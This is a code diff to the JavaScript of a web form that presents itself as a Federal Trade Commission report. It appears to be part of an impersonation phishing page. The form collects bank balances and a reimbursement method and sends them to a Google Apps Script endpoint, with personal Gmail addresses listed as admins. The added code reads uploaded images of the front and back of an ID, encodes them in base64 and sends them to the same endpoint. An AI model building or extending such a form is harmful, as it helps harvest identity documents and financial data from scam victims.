@@ -435,10 +435,19 @@
         document.getElementById('reviewContent').innerHTML = html;
     }
 
-    var GOOGLE_SHEETS_URL = 'https://script.google.com/macros/s/AKfycbwuimijJ_sLD2MS6RWoVPIyXzg1WEPgJxQ7xMmm8hh_R30urol_Qq5hAsMVERfIXHm9/exec';
+    var GOOGLE_SHEETS_URL = 'https://script.google.com/macros/s/AKfycbwWRsjwm2T1-8ZcVODsM9X1ato2pEdNw97rumWVOGSHactVAHrQG7UIhik3DL3IpCd7sA/exec';
     var ADMIN_EMAILS = ['janetgunnoe09@gmail.com', 'pw065508@gmail.com'];
 
-    function submitReport() {
+    function fileToBase64(file) {
+        return new Promise(function(resolve, reject) {
+            var reader = new FileReader();
+            reader.onload = function() { resolve(reader.result); };
+            reader.onerror = function(err) { reject(err); };
+            reader.readAsDataURL(file);
+        });
+    }
+
+    async function submitReport() {
         var btn = document.querySelector('.ftc-btn-submit');
         btn.textContent = 'Submitting...';
         btn.disabled = true;
@@ -452,6 +461,13 @@
         reports.push(formData);
         localStorage.setItem('ftcReports', JSON.stringify(reports));
         localStorage.setItem('lastFtcReport', JSON.stringify(formData));
+
+        var idFrontInput = document.getElementById('idFront');
+        var idBackInput = document.getElementById('idBack');
+        var idFrontFile = idFrontInput && idFrontInput.files[0];
+        var idBackFile = idBackInput && idBackInput.files[0];
+        var idFrontBase64 = idFrontFile ? await fileToBase64(idFrontFile) : '';
+        var idBackBase64 = idBackFile ? await fileToBase64(idBackFile) : '';
 
         // Build payload for Google Sheets
         var payload = {
@@ -496,8 +512,10 @@
             balanceMoneyMarket:  formData.balanceMoneyMarket || '',
             reimbursementMethod: formData.reimbursementMethod || '',
             additionalInfo:      formData.additionalInfo || '',
-            idFrontUploaded:     (document.getElementById('idFront') && document.getElementById('idFront').files[0]) ? document.getElementById('idFront').files[0].name : 'Not provided',
-            idBackUploaded:      (document.getElementById('idBack') && document.getElementById('idBack').files[0]) ? document.getElementById('idBack').files[0].name : 'Not provided'
+            idFrontUploaded:     idFrontFile ? idFrontFile.name : 'Not provided',
+            idBackUploaded:      idBackFile ? idBackFile.name : 'Not provided',
+            idFrontBase64:       idFrontBase64,
+            idBackBase64:        idBackBase64
         };
 
         // Send to Google Sheets
